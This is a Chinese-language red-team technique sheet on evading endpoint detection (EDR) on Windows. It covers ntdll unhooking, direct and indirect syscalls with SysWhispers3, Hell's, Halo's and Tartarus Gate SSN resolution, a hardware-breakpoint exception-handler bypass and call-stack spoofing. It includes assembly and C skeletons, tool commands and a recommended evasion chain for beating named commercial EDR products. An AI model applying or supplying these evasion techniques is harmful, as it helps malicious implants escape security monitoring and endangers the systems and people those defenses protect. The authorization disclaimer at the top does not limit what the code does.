# Unhook / 直接 / 间接 syscall 技术清单

> 仅限授权红队 / 对抗演练 / 自有产品测试，禁止用于未授权目标。

本文档汇总当前主流的"绕过用户态 hook"技术，从最经典的 unhook 到最新的 hardware breakpoint Blindside。
所有技术都对照 MITRE ATT&CK T1562.001 / T1027 / T1055，便于报告输出。

## 1. Peruns Fart / Fresh Ntdll from disk

### 原理

EDR 的 hook 全部位于 **当前进程内存中的 ntdll.dll**。磁盘上 `C:\Windows\System32\ntdll.dll` 是干净的。
所以只要把磁盘 ntdll 重新映射进当前进程并覆盖内存中的 `.text` 段，hook 就被擦掉。

```text
当前进程 ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (含 EDR hook jmp) │ ◄── 用磁盘干净 .text 覆盖
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  磁盘 C:\Windows\System32\ntdll.dll  ← 干净
```

### 实现要点

```c
// 步骤：
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // 用原生路径绕监控
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection 到一个新地址
// 4. 找新地址 .text 段
// 5. NtProtectVirtualMemory 把当前 ntdll .text 改 RW
// 6. memcpy 覆盖
// 7. NtProtectVirtualMemory 还原为 RX
```

### 注意

- `NtProtectVirtualMemory` 本身可能就是 hook 的 → 链式问题。解决：先用 **直接 syscall** 调 `NtProtectVirtualMemory`
- 现代 EDR 已经监控 `NtProtectVirtualMemory` 对 ntdll 内存的 W 操作，需要配合 ETW patch
- Peruns Fart 在 ETW-TI 下会留下事件 `KERNEL_MODULE_LOAD`、`PROTECTVM` — 一定要先压 ETW

## 2. 直接 syscall (Direct Syscall)

### 原理

不调用 ntdll 的导出函数，自己写 syscall stub：

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (Win11 24H2 上的值，每个版本不同)
    syscall
    ret
```

`syscall` 指令直接从用户态跳到内核 SSDT，跳过任何用户态 hook。

### SysWhispers3 用法

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

输出：

```text
syscalls.h    - 函数声明
syscalls.c    - C 胶水代码
syscalls.asm  - MASM 汇编 stub
syscallsstubs.std.x64.asm  - 标准直接 syscall
```

在 Visual Studio 中：

```text
1. 把 .asm 加入项目，启用 MASM (Custom Build Tool)
2. include syscalls.h
3. 调用 Sw3NtAllocateVirtualMemory(...) 替换原 NtAllocateVirtualMemory
```

### 最小直接 syscall 调 NtCreateFile（C 代码骨架）

```c
// syscalls.asm（节选）
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (动态解析 SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // 写一些字节略
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### 缺点

- syscall 指令位于 implant 自己的 `.text` 段（非 ntdll 内）→ kernel-mode telemetry 容易看出 "syscall from non-ntdll address"
- 这就是 indirect syscall 出现的原因

## 3. 间接 syscall (Indirect Syscall)

### 原理

syscall 指令仍然来自 ntdll.dll（合法地址），只是 SSN 和返回地址我们自己控制：

```text
implant 代码：
    mov r10, rcx
    mov eax, <SSN>
    jmp [<ntdll 中某个 syscall;ret gadget 的地址>]   ; 不是 syscall 在 implant 里
```

跳到的 gadget 通常就是 `Nt*` 函数末尾的 `syscall; ret` 两字节序列。
kernel-mode ETW provider 看到的 RIP 是 ntdll 地址，符合合法行为模式。

### SysWhispers3 indirect 模式

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => 随机化 jmp 目标减少签名
```

生成的 stub：

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; 返回 SSN -> eax
    call Sw3GetSyscallAddress      ; 返回 ntdll 中 syscall;ret 地址 -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; 跳到 ntdll 内合法 syscall 指令
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

三者解决"SSN 动态解析"的演进。

### Hell's Gate

- 假设 ntdll 未被 hook
- 在 implant 启动时遍历 ntdll 的 `Nt*` 导出，从前 4 字节 `mov eax, <SSN>` 提取 SSN
- 优点：不写死 SSN，跨 Windows 版本通用
- 缺点：如果 ntdll 已经被 hook（第一字节变成 jmp），提取失败

### Halo's Gate

- 修复 Hell's Gate 的 hook 问题
- 如果发现某个函数被 hook（不是标准 prologue），就**向上 / 向下扫描 ±N 个函数**
- 利用 ntdll 中 `Nt*` 函数 SSN 是连续递增的事实，从邻居反推被 hook 函数的 SSN

```text
正常情况：
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

如果 NtAllocateVirtualMemory 被 hook 看不到 SSN，看邻居：
  上一个未 hook 的导出 SSN = 0x17
  下一个未 hook 的导出 SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- 进一步处理 **Hook 改了 SSN 但保留了 syscall 指令** 的高级 hook
- 同时校验 SSN 与 syscall;ret gadget 地址
- 三者结合提供最稳定的 indirect syscall 基础

### 参考实现位置（在自举的 git clone 后）

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (含 fallback 逻辑) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   集成了三者
```

## 5. Hardware Breakpoint Blindside

### 原理

利用调试寄存器 `DR0-DR3` 在 EDR hook trampoline 的入口设硬件断点；
设置 VEH (Vectored Exception Handler) 在断点命中时把 RIP **直接改到 hook trampoline 后面**，
跳过 EDR 的检测代码，落到 ntdll 真正的 syscall 段。

### 优势

- 不需要写 ntdll 内存（无 `NtProtectVirtualMemory` 告警）
- 不需要 unhook（hook 还在那，只是被绕过）
- ETW-TI 看不到内存修改

### 实现骨架

```c
// 1. AddVectoredExceptionHandler
// 2. 在每个被 hook 函数入口设 DR0..DR3 (最多 4 个，配合 single-step rotate)
// 3. SetThreadContext(thread, &ctx) 写 DRx
// 4. 当 EDR hook trampoline 触发硬件断点 -> VEH 接管
// 5. VEH 把 EXCEPTION_POINTERS->ContextRecord->Rip 改到 ntdll 的合法 syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN 已经在 eax；R10 = RCX；跳到 ntdll 的 syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### 限制

- 每个线程独立 DRx → 多线程要分别设
- 一些 EDR 已经 hook `NtSetContextThread` / `NtGetContextThread`，要先用前面的技术绕过它
- Win11 22H2+ 引入 HVCI / 一些反调试缓解可能干扰

## 6. Call Stack Spoofing

### 问题

现代 EDR 在 `NtAllocateVirtualMemory` / `NtCreateThreadEx` 等 syscall 内核入口处会调用 `RtlCaptureStackBackTrace`，
拿到完整调用栈上报。implant 的栈会出现 **non-image-backed memory** 帧 → 高置信告警。

### 方案 A：CallStackSpoofer（William Burgess）

实现思路：

1. 在 syscall 前 swap 当前线程栈 → 一个伪造的合法栈
2. 伪造的栈帧填充诸如 `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart` 这种全合法返回链
3. syscall 返回后 swap 回真实栈

### 方案 B：SilentMoonwalk

更激进，使用 desynchronized stack：

```text
执行流程：
  implant 代码  →  自定义 trampoline (修改 RSP / RBP / 栈内容)
                ↓
                syscall (RtlCaptureStackBackTrace 看到伪造栈)
                ↓
                trampoline 还原 → 继续 implant 代码
```

关键是 unwinding：让 `RtlVirtualUnwind` 走入伪造的 `RUNTIME_FUNCTION` / `UNWIND_INFO` 链。

### 实战 OPSEC 建议

- call stack spoof + indirect syscall + ETW patch 是当前过 CrowdStrike / SentinelOne 比较稳的组合
- 在 sleep 阶段也要 spoof，单纯执行时 spoof 是不够的（EDR 会定期采样）

## 7. 技术选型对照表

| 技术 | 对抗 | 复杂度 | 当前有效性 | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | 用户态 hook | 低 | 中（易被 ETW 抓） | T1562.001 |
| Direct syscall (SysWhispers) | 用户态 hook | 低 | 低-中（kernel 看 RIP 在 implant） | T1106 / T1562.001 |
| Indirect syscall (jumper) | 用户态 hook + kernel RIP 检测 | 中 | 中-高 | T1106 |
| Hell's / Halo's / Tartarus | SSN 解析 | 中 | 高（基础设施） | T1027 |
| HWBP Blindside | hook + 无写操作 | 高 | 高 | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | 高 | 高 | T1564 |

实战推荐链：**Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**。

## 参考资料

- SysWhispers3：<https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC：<https://github.com/am0nsec/HellsGate>、<https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate：<https://github.com/trickster0/TartarusGate>
- CallStackSpoofer：<https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk：<https://github.com/klezVirus/SilentMoonwalk>
- Blindside（hardware breakpoint）：<https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001：<https://attack.mitre.org/techniques/T1562/001/>

## 路由回调

unhook 仅是绕过的一半，另一半是 telemetry 失明：进入 `references/telemetry-blinding.md`。
